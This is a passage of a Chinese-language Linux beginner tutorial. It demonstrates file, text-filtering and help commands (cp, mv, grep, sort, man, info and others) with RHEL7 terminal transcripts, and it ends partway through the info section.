<h4 id="rmdir-实验"><a href="#rmdir-实验" class="headerlink" title="rmdir 实验"></a>rmdir 实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ mkdir aa</span><br><span class="line">[booboo@rhel7 ~]$ mkdir -p cc/bb</span><br><span class="line">[booboo@rhel7 ~]$ rmdir aa</span><br><span class="line">[booboo@rhel7 ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx. 1 booboo booboo  3 Jun 15 23:34 booboo</span><br><span class="line">drwxrwxr-x. 3 booboo booboo 15 Jun 16 00:08 cc</span><br><span class="line">[booboo@rhel7 ~]$ rmdir cc</span><br><span class="line">rmdir: failed to remove ‘cc’: Directory not empty</span><br><span class="line">[booboo@rhel7 ~]$ rm -rf cc</span><br><span class="line">[booboo@rhel7 ~]$ ll</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx. 1 booboo booboo 3 Jun 15 23:34 booboo</span><br></pre></td></tr></table></figure>

<h3 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h3><p>cp:copy 复制文件</p>
<p>cp 源文件 目的地(目录)</p>
<p>-p 保留文件原属性</p>
<p>-r 复制目录</p>
<h4 id="cp实验"><a href="#cp实验" class="headerlink" title="cp实验"></a>cp实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">使用 root 用户,进入 tom 的家目录</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# cd /home/tom</span><br><span class="line"></span><br><span class="line">保留原文件属性复制 testa_3 文件到 /tmp 目录下</span><br><span class="line"></span><br><span class="line">[root@rhel7 tom]# cp -p testa_3 /tmp</span><br><span class="line">[root@rhel7 tom]# ll /tmp/testa_3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 /tmp/testa_3</span><br><span class="line">[root@rhel7 tom]# cp testa_4 /tmp</span><br><span class="line">[root@rhel7 tom]# ll /tmp/testa_4</span><br><span class="line">-rw-r--r--. 1 root root 0 Mar 21 01:55 /tmp/testa_4</span><br><span class="line"></span><br><span class="line">拷贝目录 a 到 /tmp 下,必须加上 -r ,因为 a 目录下还有 b/c 目录</span><br><span class="line"></span><br><span class="line">[root@rhel7 tom]# cp a /tmp</span><br><span class="line">cp: omitting directory `a'</span><br><span class="line">[root@rhel7 tom]# cp -r a /tmp</span><br></pre></td></tr></table></figure>

<h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p>mv:move 移动 移动和重命名</p>
<p>mv 源文件 目的地(目录)</p>
<h4 id="mv实验"><a href="#mv实验" class="headerlink" title="mv实验"></a>mv实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ mv testa_3 test</span><br><span class="line">[tom@rhel7 ~]$ ls</span><br><span class="line">a</span><br><span class="line">c f testa_4 testb_3 testc_2</span><br><span class="line">ab cd d p testb_1 testb_4 testc_3</span><br><span class="line">b</span><br><span class="line">e test testb_2 testc_1 testc_4</span><br><span class="line">[tom@rhel7 ~]$ mv test??? f/</span><br><span class="line">[tom@rhel7 ~]$ ll -R f</span><br><span class="line">f:</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file1</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file2</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:47 file4</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testa_4</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_1</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_2</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testb_4</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_1</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_2</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_3</span><br><span class="line">-rw-rw-r--. 1 tom tom 0 Mar 21 01:31 testc_4</span><br></pre></td></tr></table></figure>


<h2 id="针对文件内容的基本操作"><a href="#针对文件内容的基本操作" class="headerlink" title="针对文件内容的基本操作"></a>针对文件内容的基本操作</h2><h3 id="文件的查看"><a href="#文件的查看" class="headerlink" title="文件的查看"></a>文件的查看</h3><table>
<thead>
<tr>
<th align="left">文件</th>
<th align="left">命令</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">小文件</td>
<td align="left">cat</td>
<td align="left">以正序查看 调用内存比较多 -n 显示行号</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">tac</td>
<td align="left">以倒序查看 调用内存比较多</td>
</tr>
<tr>
<td align="left">大文件</td>
<td align="left">head</td>
<td align="left">查看文件首部，默认10行 ，-n 指定行号</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">tail</td>
<td align="left">查看文件尾部，默认10行，-n指定行号</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">more</td>
<td align="left">按空格 space 下一页 b 向上翻页 enter 下一行</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">less</td>
<td align="left">比 more 多了一个搜索功能 /[ 需搜索的子段 ]N 向上查找 n 向下查 q 退出</td>
</tr>
</tbody></table>
<h4 id="文件查看实验"><a href="#文件查看实验" class="headerlink" title="文件查看实验"></a>文件查看实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[tom@rhel7 ~]$ cat -n passwd</span><br><span class="line">1 root:x:0:0:root:/root:/bin/bash</span><br><span class="line">2 bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">3 daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">4 adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">6 sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">8 halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">9 mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">10 cong:x:500:500:cong:/home/cong:/bin/bash</span><br><span class="line">11 nginx:x:496:491:Nginx web server:/var/lib/nginx:/sbin/nologin</span><br><span class="line">12 tom:x:501:501::/home/tom:/bin/bash</span><br><span class="line">[tom@rhel7 ~]$ tac passwd</span><br><span class="line">tom:x:501:501::/home/tom:/bin/bash</span><br><span class="line">nginx:x:496:491:Nginx web server:/var/lib/nginx:/sbin/nologin</span><br><span class="line">cong:x:500:500:cong:/home/cong:/bin/bash</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="文件的修改"><a href="#文件的修改" class="headerlink" title="文件的修改"></a>文件的修改</h3><table>
<thead>
<tr>
<th align="left">软件</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">LibreOffice</td>
<td align="left">.odt 结尾 类似于 windows office</td>
</tr>
<tr>
<td align="left">gedit</td>
<td align="left">类似于 windows 记事本</td>
</tr>
<tr>
<td align="left">vim</td>
<td align="left">插入模式 后面会专门讲到 vim 编辑器的使用 退出模式 命令模式</td>
</tr>
<tr>
<td align="left">echo</td>
<td align="left">本身代表回显 echo xxx &gt; file 将 xxx 写入 file 文件,并覆盖原有内容 echo xxx &gt;&gt; file 在 file 文件追加</td>
</tr>
</tbody></table>
<h4 id="echo实验"><a href="#echo实验" class="headerlink" title="echo实验"></a>echo实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ echo hi &gt; file1</span><br><span class="line">[booboo@rhel7 ~]$ cat file1</span><br><span class="line">hi</span><br><span class="line">[booboo@rhel7 ~]$ echo booboo &gt; file1</span><br><span class="line">[booboo@rhel7 ~]$ cat file1</span><br><span class="line">booboo</span><br><span class="line">[booboo@rhel7 ~]$ echo hihihihi &gt;&gt; file1</span><br><span class="line">[booboo@rhel7 ~]$ cat file1</span><br><span class="line">booboo</span><br><span class="line">hihihihi</span><br></pre></td></tr></table></figure>

<h3 id="文件的过滤"><a href="#文件的过滤" class="headerlink" title="文件的过滤"></a>文件的过滤</h3><p>grep</p>
<p>截取行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep [OPTIONS] PATTERN [FILE...]</span><br><span class="line">过滤带有 [ 字符串 ] 的行</span><br><span class="line">grep [ 字符串 ] [ 文件 ]	</span><br><span class="line">过滤以 [ 字符串 ] 为开始的行</span><br><span class="line">grep [^ 字符串 ] [ 文件 ]</span><br><span class="line">过滤以 [ 字符串 ] 为结尾的行</span><br><span class="line">grep [ 字符串 $] [ 文件 ]</span><br><span class="line">过滤反选</span><br><span class="line">grep -v [ 字符串 ] [ 文件 ]</span><br><span class="line"></span><br><span class="line">eg.</span><br><span class="line">过滤以 root 为开始的行</span><br><span class="line"> grep ^root /etc/passwd</span><br><span class="line">过滤以 bash 为结尾的行</span><br><span class="line">grep bash$ /etc/passwd</span><br></pre></td></tr></table></figure>

<p>cut</p>
<p>截取列</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cut -d" 分割符 "( 以什么为分隔符 ) -fn( 第几列 ) [ 文件 ]</span><br><span class="line">eg. cut -d":" -f2 /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>wc</p>
<p>统计</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wc 行数 单词数 字符数 文件名</span><br><span class="line">-l 只显示行数</span><br><span class="line">-w, --words 显示单词数</span><br><span class="line">-c, -m,--bytes 显示字节</span><br><span class="line">eg.</span><br><span class="line">[root@stu15 ~]# wc /etc/resolv.conf 、</span><br><span class="line">4 11 98 /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>sort</p>
<p>排序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">默认按照首字母 ACII 码</span><br><span class="line">-n 按照数字大小排序</span><br><span class="line">-u 剔除重复的行</span><br><span class="line">-r 降序排列</span><br><span class="line">-k 指定某一列</span><br><span class="line">-t 分隔符</span><br><span class="line">eg.sort -n -k 2 -t : file1 </span><br><span class="line">将 file1 以第二列的数字排序,列以:分割</span><br></pre></td></tr></table></figure>

<p>uniq</p>
<p>剔除重复行</p>
<p><code>uniq [file_name]</code></p>
<h4 id="文件过滤实验"><a href="#文件过滤实验" class="headerlink" title="文件过滤实验"></a>文件过滤实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">grep</span><br><span class="line"></span><br><span class="line">[booboo@rhel7 ~]$ grep root passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">[booboo@rhel7 ~]$ grep ^booboo passwd</span><br><span class="line">booboo:x:1001:1001::/home/booboo:/bin/bash</span><br><span class="line">[booboo@rhel7 ~]$ grep ^root passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">[booboo@rhel7 ~]$ grep bash$ passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">student:x:1000:1000:student:/home/student:/bin/bash</span><br><span class="line">booboo:x:1001:1001::/home/booboo:/bin/bash</span><br><span class="line">[booboo@rhel7 ~]$ grep -v nologin passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">student:x:1000:1000:student:/home/student:/bin/bash</span><br><span class="line">booboo:x:1001:1001::/home/booboo:/bin/bash</span><br><span class="line"></span><br><span class="line">cut</span><br><span class="line"></span><br><span class="line">[booboo@rhel7 ~]$ cut -d":" -f1 passwd</span><br><span class="line">root</span><br><span class="line">bin</span><br><span class="line">daemon</span><br><span class="line">adm</span><br><span class="line">lp</span><br><span class="line">sync</span><br><span class="line">shutdown</span><br><span class="line">halt</span><br><span class="line">mail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wc</span><br><span class="line"></span><br><span class="line">[booboo@rhel7 ~]$ wc passwd</span><br><span class="line">  42   72 2121 passwd</span><br><span class="line">[booboo@rhel7 ~]$ wc -l passwd</span><br><span class="line">42 passwd</span><br><span class="line">[booboo@rhel7 ~]$ wc -w passwd</span><br><span class="line">72 passwd</span><br><span class="line">[booboo@rhel7 ~]$ wc -c passwd</span><br><span class="line">2121 passwd</span><br><span class="line"></span><br><span class="line">sort</span><br><span class="line"></span><br><span class="line">[booboo@rhel7 ~]$ vi num</span><br><span class="line">[booboo@rhel7 ~]$ cat num</span><br><span class="line">booboo 20 100</span><br><span class="line">tom 21 100</span><br><span class="line">tom 21 100</span><br><span class="line">kevin 19 200</span><br><span class="line">booboo 20 100</span><br><span class="line">mark 20 200</span><br><span class="line">[booboo@rhel7 ~]$ sort num</span><br><span class="line">booboo 20 100</span><br><span class="line">booboo 20 100</span><br><span class="line">kevin 19 200</span><br><span class="line">mark 20 200</span><br><span class="line">tom 21 100</span><br><span class="line">tom 21 100</span><br><span class="line">[booboo@rhel7 ~]$ sort -r num</span><br><span class="line">tom 21 100</span><br><span class="line">tom 21 100</span><br><span class="line">mark 20 200</span><br><span class="line">kevin 19 200</span><br><span class="line">booboo 20 100</span><br><span class="line">booboo 20 100</span><br><span class="line">[booboo@rhel7 ~]$ sort -u num</span><br><span class="line">booboo 20 100</span><br><span class="line">kevin 19 200</span><br><span class="line">mark 20 200</span><br><span class="line">tom 21 100</span><br><span class="line">[booboo@rhel7 ~]$ sort -n -k 2 -t " " num |sort -u</span><br><span class="line">booboo 20 100</span><br><span class="line">kevin 19 200</span><br><span class="line">mark 20 200</span><br><span class="line">tom 21 100</span><br><span class="line"></span><br><span class="line">uniq</span><br><span class="line"></span><br><span class="line">[booboo@rhel7 ~]$ uniq num</span><br><span class="line">booboo 20 100</span><br><span class="line">tom 21 100</span><br><span class="line">kevin 19 200</span><br><span class="line">booboo 20 100</span><br><span class="line">mark 20 200</span><br></pre></td></tr></table></figure>

<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">type [ 命令 ]</td>
<td align="left">判断是内部命令 or 外部命令</td>
</tr>
<tr>
<td align="left">–help</td>
<td align="left">外部命令</td>
</tr>
<tr>
<td align="left">help</td>
<td align="left">只针对系统内部命令</td>
</tr>
<tr>
<td align="left">man []</td>
<td align="left">内容清晰、详细,在线文档,支持搜索( /name ) <code>man [ 章节 ] [name]</code></td>
</tr>
<tr>
<td align="left">info []</td>
<td align="left">太详细</td>
</tr>
<tr>
<td align="left">/usr/share/doc</td>
<td align="left">存放帮助文档,在与软件同名的目录下有所有软件的使用文档</td>
</tr>
</tbody></table>
<p><strong>man和—help以及help的区别</strong></p>
<p>man命令</p>
<p>系统中会有单独的man文件，就是说，如果系统没有安装对应man文件，哪怕命令完全正常，man都没结果（同样，只要安装了man文件，哪怕没命令，也可以得到一大堆东西）。</p>
<p>–help参数<br>将会显示可执行程序自带的信息，这些信息是嵌入到程序本身的，所以–help信息较简短。</p>
<p>help命令<br>是选项帮助命令，顾名思义  你可以把单独某个命令的某个选项列出来，方便快捷很多，省去了man当中查找的繁琐，但是help只支持shell的内部命令。内部命令即存储在shell内部可以直接调用的一些简单命令，比如说echo，cd，pwd等。</p>
<h3 id="type"><a href="#type" class="headerlink" title="type"></a>type</h3><p>type命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">type(选项)(参数)</span><br><span class="line">选项</span><br><span class="line">-t：输出“file”、“alias”或者“builtin”，分别表示给定的指令为“外部指令”、“命令别名”或者“内部指令”；</span><br><span class="line">-p：如果给出的指令为外部指令，则显示其绝对路径；</span><br><span class="line">-a：在环境变量“PATH”指定的路径中，显示给定指令的信息，包括命令别名。 参数 指令：要显示类型的指令。</span><br><span class="line">参数</span><br><span class="line">关键字：指定要搜索帮助的关键字</span><br><span class="line">命令类型</span><br><span class="line">alias：别名</span><br><span class="line">keyword：关键字，Shell保留字</span><br><span class="line">function：函数，Shell函数</span><br><span class="line">builtin：内建命令，Shell内建命令</span><br><span class="line">file：文件，磁盘文件，外部命令</span><br><span class="line">unfound：没有找到</span><br><span class="line"></span><br><span class="line">尝试几个命令man,ls,touch,echo,cat</span><br><span class="line"></span><br><span class="line">[booboo@rhel7 ~]$ type man</span><br><span class="line">man is /bin/man</span><br><span class="line">[booboo@rhel7 ~]$ type ls</span><br><span class="line">ls is aliased to `ls –color=auto'</span><br><span class="line">[booboo@rhel7 ~]$ which ls</span><br><span class="line">alias ls='ls --color=auto'</span><br><span class="line">	/bin/ls</span><br><span class="line">[booboo@rhel7 ~]$ type touch</span><br><span class="line">touch is hashed (/bin/touch)</span><br><span class="line">[booboo@rhel7 ~]$ type echo</span><br><span class="line">echo is a shell builtin</span><br><span class="line">[booboo@rhel7 ~]$ type cat</span><br><span class="line">cat is hashed (/bin/cat)</span><br></pre></td></tr></table></figure>
<p>内置命令一般显示为“is a shell builtin ”</p>
<p>除了内置命令外，其他命令都是通过某个安装包安装生成的可执行文件</p>
<p>接下来我们一起看看这些命令都是什么软件生成的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ rpm -qf /bin/man</span><br><span class="line">man-db-2.6.3-9.el7.x86_64</span><br><span class="line">[booboo@rhel7 ~]$ rpm -qf /bin/ls</span><br><span class="line">coreutils-8.22-11.el7.x86_64</span><br><span class="line">[booboo@rhel7 ~]$ rpm -qf /bin/touch</span><br><span class="line">coreutils-8.22-11.el7.x86_64</span><br><span class="line">[booboo@rhel7 ~]$ rpm -qf /bin/cat</span><br><span class="line">coreutils-8.22-11.el7.x86_64</span><br><span class="line">[booboo@rhel7 ~]$ type if</span><br><span class="line">if is a shell keyword</span><br></pre></td></tr></table></figure>

<h3 id="–help-参数"><a href="#–help-参数" class="headerlink" title="–help 参数"></a>–help 参数</h3><p>–help参数是大所数命令自带的选项，用于查看使用帮助。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ ls --help</span><br><span class="line">Usage: ls [OPTION]... [FILE]...</span><br><span class="line">List information about the FILEs (the current directory by default).</span><br><span class="line">Sort entries alphabetically if none of -cftuvSUX nor --sort is specified.</span><br><span class="line"></span><br><span class="line">Mandatory arguments to long options are mandatory for short options too.</span><br><span class="line">  -a, --all                  do not ignore entries starting with .</span><br><span class="line">  -A, --almost-all           do not list implied . and ..</span><br><span class="line">      --author               with -l, print the author of each file</span><br><span class="line">  -b, --escape               print C-style escapes for nongraphic characters</span><br><span class="line">      --block-size=SIZE      scale sizes by SIZE before printing them; e.g.,</span><br><span class="line">                               '--block-size=M' prints sizes in units of</span><br><span class="line">                               1,048,576 bytes; see SIZE format below</span><br><span class="line">  -B, --ignore-backups       do not list implied entries ending with ~</span><br><span class="line">  -c                         with -lt: sort by, and show, ctime (time of last</span><br><span class="line">                               modification of file status information);</span><br><span class="line">                               with -l: show ctime and sort by name;</span><br><span class="line">                               otherwise: sort by ctime, newest first</span><br><span class="line">  -C                         list entries by columns</span><br><span class="line">      --color[=WHEN]         colorize the output; WHEN can be 'never', 'auto',</span><br><span class="line">                               or 'always' (the default); more info below</span><br><span class="line">  -d, --directory            list directories themselves, not their contents</span><br><span class="line">  -D, --dired                generate output designed for Emacs' dired mode</span><br><span class="line">  -f                         do not sort, enable -aU, disable -ls --color</span><br></pre></td></tr></table></figure>

<h3 id="help"><a href="#help" class="headerlink" title="help"></a>help</h3><p>help只支持shell的内部命令。内部命令即存储在shell内部可以直接调用的一些简单命令,例如cd,echo,help等。</p>
<p>help(选项)(参数)<br>-s：输出短格式的帮助信息。仅包括命令格式。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ type cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">[booboo@rhel7 ~]$ help cd</span><br><span class="line">cd: cd [-L|[-P [-e]]] [dir]</span><br><span class="line">    Change the shell working directory.</span><br><span class="line"></span><br><span class="line">    Change the current directory to DIR.  The default DIR is the value of the</span><br><span class="line">    HOME shell variable.</span><br><span class="line"></span><br><span class="line">    The variable CDPATH defines the search path for the directory containing</span><br><span class="line">    DIR.  Alternative directory names in CDPATH are separated by a colon (:).</span><br><span class="line">    A null directory name is the same as the current directory.  If DIR begins</span><br><span class="line">    with a slash (/), then CDPATH is not used.</span><br><span class="line"></span><br><span class="line">    If the directory is not found, and the shell option `cdable_vars' is set,</span><br><span class="line">    the word is assumed to be  a variable name.  If that variable has a value,</span><br><span class="line">    its value is used for DIR.</span><br><span class="line"></span><br><span class="line">    Options:</span><br><span class="line">        -L	force symbolic links to be followed</span><br><span class="line">        -P	use the physical directory structure without following symbolic</span><br><span class="line">    	links</span><br><span class="line">        -e	if the -P option is supplied, and the current working directory</span><br><span class="line">    	cannot be determined successfully, exit with a non-zero status</span><br><span class="line"></span><br><span class="line">    The default is to follow symbolic links, as if `-L' were specified.</span><br><span class="line"></span><br><span class="line">    Exit Status:</span><br><span class="line">    Returns 0 if the directory is changed, and if $PWD is set successfully when</span><br><span class="line">    -P is used; non-zero otherwise.</span><br><span class="line">[booboo@rhel7 ~]$ type touch</span><br><span class="line">touch is hashed (/bin/touch)</span><br><span class="line">[booboo@rhel7 ~]$ type echo</span><br><span class="line">echo is a shell builtin</span><br><span class="line">[booboo@rhel7 ~]$ help echo</span><br><span class="line">echo: echo [-neE] [arg ...]</span><br></pre></td></tr></table></figure>

<h3 id="man"><a href="#man" class="headerlink" title="man"></a>man</h3><p>man命令是Linux下的帮助指令，通过man指令可以查看Linux中的指令帮助、配置文件帮助和编程帮助等信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">man(选项)(参数)</span><br><span class="line">选项</span><br><span class="line">-a：在所有的man帮助手册中搜索；</span><br><span class="line">-f：等价于whatis指令，显示给定关键字的简短描述信息；</span><br><span class="line">-P：指定内容时使用分页程序；</span><br><span class="line">-M：指定man手册搜索的路径。</span><br><span class="line">参数</span><br><span class="line">数字：指定从哪本man手册中搜索帮助</span><br><span class="line">关键字：指定要搜索帮助的关键字</span><br></pre></td></tr></table></figure>

<p>例如输入man ls，它会在左上角显示“ECHO(1)”“ECHO”代表手册名称；“(1)”代表 表示该手册位于第一节章1）”表示该手册位于第一节章，同样，我们输man ifconfig它会在最左上角显示“IFCONFIG（8）”。也可以这样输入命令：“man [章节号] 手册名称”。 man是按照手册的章节号的顺序进行搜索的，比如： man sleep 只会显示sleep命令的手册,如果想查看库函数sleep，就要输入: man 3 sleep</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ man echo|cat</span><br><span class="line">ECHO(1)                         User Commands                         ECHO(1)</span><br><span class="line"><span class="meta">#</span><span class="bash">此处“ECHO”代表手册名称；“（1）”代表 表示该手册位于第一节章</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       echo - display a line of text</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       echo [SHORT-OPTION]... [STRING]...</span><br><span class="line">       echo LONG-OPTION</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       Echo the STRING(s) to standard output.</span><br><span class="line"></span><br><span class="line">       -n     do not output the trailing newline</span><br><span class="line"></span><br><span class="line">       -e     enable interpretation of backslash escapes</span><br><span class="line"></span><br><span class="line">       -E     disable interpretation of backslash escapes (default)</span><br><span class="line"></span><br><span class="line">       --help display this help and exit</span><br><span class="line"></span><br><span class="line">       --version</span><br><span class="line">              output version information and exit</span><br><span class="line"></span><br><span class="line">       If -e is in effect, the following sequences are recognized:</span><br><span class="line"></span><br><span class="line">       \\     backslash</span><br><span class="line"></span><br><span class="line">       \a     alert (BEL)</span><br><span class="line"></span><br><span class="line">       \b     backspace</span><br><span class="line"></span><br><span class="line">       \c     produce no further output</span><br><span class="line"></span><br><span class="line">       \e     escape</span><br><span class="line"></span><br><span class="line">       \f     form feed</span><br><span class="line"></span><br><span class="line">       \n     new line</span><br><span class="line"></span><br><span class="line">       \r     carriage return</span><br><span class="line"></span><br><span class="line">       \t     horizontal tab</span><br><span class="line"></span><br><span class="line">       \v     vertical tab</span><br><span class="line"></span><br><span class="line">       \0NNN  byte with octal value NNN (1 to 3 digits)</span><br><span class="line"></span><br><span class="line">       \xHH   byte with hexadecimal value HH (1 to 2 digits)</span><br><span class="line"></span><br><span class="line">       NOTE:  your  shell  may  have  its  own version of echo, which usually</span><br><span class="line">       supersedes the version described here.  Please refer to  your  shell's</span><br><span class="line">       documentation for details about the options it supports.</span><br><span class="line"></span><br><span class="line">       GNU  coreutils  online  help: &lt;http://www.gnu.org/software/coreutils/&gt;</span><br><span class="line">       Report echo translation bugs to &lt;http://translationproject.org/team/&gt;</span><br><span class="line">AUTHOR</span><br><span class="line">       Written by Brian Fox and Chet Ramey.</span><br><span class="line">COPYRIGHT</span><br><span class="line">       Copyright © 2013 Free Software Foundation, Inc.  License  GPLv3+:  GNU</span><br><span class="line">       GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;.</span><br><span class="line">       This  is  free  software:  you are free to change and redistribute it.</span><br><span class="line">       There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">SEE ALSO</span><br><span class="line">       The full documentation for echo is maintained as a Texinfo manual.  If</span><br><span class="line">       the  info  and  echo programs are properly installed at your site, the</span><br><span class="line">       command</span><br><span class="line">             info coreutils 'echo invocation'</span><br><span class="line">      should give you access to the complete manual.</span><br><span class="line"></span><br><span class="line">GNU coreutils 8.22               January 2014                         ECHO(1)</span><br></pre></td></tr></table></figure>

<h3 id="info（作为拓展内容）"><a href="#info（作为拓展内容）" class="headerlink" title="info（作为拓展内容）"></a>info（作为拓展内容）</h3><p>info命令是Linux下info格式的帮助指令。 就内容来说，info页面比man page编写得要更好、更容易理解，也更友好，但man page使用起来确实要更容易得多。一个man page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。理解这个命令的窍门就是不仅要学习如何在单独的Info页面中浏览导航，还要学习如何在节点和子节点之间切换。可能刚开始会一时很难在info页面的节点之间移动和找到你要的东西，真是具有讽刺意味：原本以为对于新手来说，某个东西比man命令会更好些，但实际上学习和使用起来更困难。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">info(选项)(参数)</span><br><span class="line">选项</span><br><span class="line">-d：添加包含info格式帮助文档的目录；</span><br><span class="line"> -f：指定要读取的info格式的帮助文档；</span><br><span class="line">-n：指定首先访问的info帮助文件的节点；</span><br><span class="line"> -o：输出被选择的节点内容到指定文件。</span><br><span class="line">参数</span><br><span class="line"> 帮助主题：指定需要获得帮助的主题，可以是指令、函数以及配置文件。</span><br><span class="line">常用快捷键</span><br><span class="line">?键：它就会显示info的常用快捷键。</span><br><span class="line">N键：显示（相对于本节点的）下一节点的文档内容。</span><br><span class="line">P键：显示（相对于本节点的）前一节点的文档内容。</span><br><span class="line">U键：进入当前命令所在的主题。</span><br><span class="line">M键：敲M键后输入命令的名称就可以查看该命令的帮助文档了。</span><br><span class="line">G键：敲G键后输入主题名称，进入该主题。</span><br><span class="line">L键：回到上一个访问的页面。 SPACE键：向前滚动一页。</span><br><span class="line">BACKUP或DEL键：向后滚动一页。</span><br><span class="line">Q：退出info。</span><br><span class="line">命令</span><br><span class="line">？ 显示帮助窗口</span><br><span class="line">在帮助窗口中：</span><br><span class="line">Ctrl-x 0 关闭帮助窗口</span><br><span class="line">Ctrl-x Ctrl-c 关闭整个 Info</span><br><span class="line">q 退出 info</span><br><span class="line">n 打开与本 Node 关联的下一个 Node</span><br><span class="line">p 打开与本 Node 关联的前一个 Node</span><br><span class="line">u 打开与本 Node 关联的上一个 Node</span><br><span class="line">l 回到上一次访问的 Node</span><br><span class="line">m或g 选择一个菜单项（Node 的名字）</span><br><span class="line">           输入指定菜单的名字后按回车，打开指定菜单项关联的 Node</span><br><span class="line">空格键 下一页（PageDown 也可以，下一页从当前页的最后两行开始算起）</span><br><span class="line">           下一个 Node （若当前页在 Node 文档的末尾）</span><br><span class="line">Del 键 上一页（PageUp 也可以，上一页从当前页的开始两行开始算起）</span><br><span class="line">       上一个 Node （若当前页 Node 文档的开始）</span><br><span class="line">b 或 t 或 Home 文档的开始（b 是 begining 的意思）</span><br><span class="line">e 或 End 文档的末尾（b 是 ending 的意思）</span><br><span 